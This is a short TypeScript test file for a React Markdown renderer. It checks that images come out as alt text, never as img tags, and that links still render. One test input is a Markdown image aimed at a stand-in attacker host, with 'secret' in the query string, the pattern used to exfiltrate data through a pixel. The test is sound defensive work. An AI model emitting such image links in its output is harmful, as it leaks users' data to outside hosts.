import { expect, test } from "bun:test";

import { renderToStaticMarkup } from "react-dom/server";

import { Markdown } from "./markdown";

const render = (markdown: string) => renderToStaticMarkup(<Markdown>{markdown}</Markdown>);

test("a Markdown image is not loaded: the viewer sees its alt text, never an img tag", () => {
  const html = render("Look: ![a chart](https://attacker.example/pixel.png?d=secret)");

  expect(html).not.toContain("<img");
  expect(html).not.toContain("attacker.example");
  expect(html).toContain("a chart");
});

test("links and text still render", () => {
  expect(render("[docs](https://bun.sh)")).toContain('href="https://bun.sh"');
});
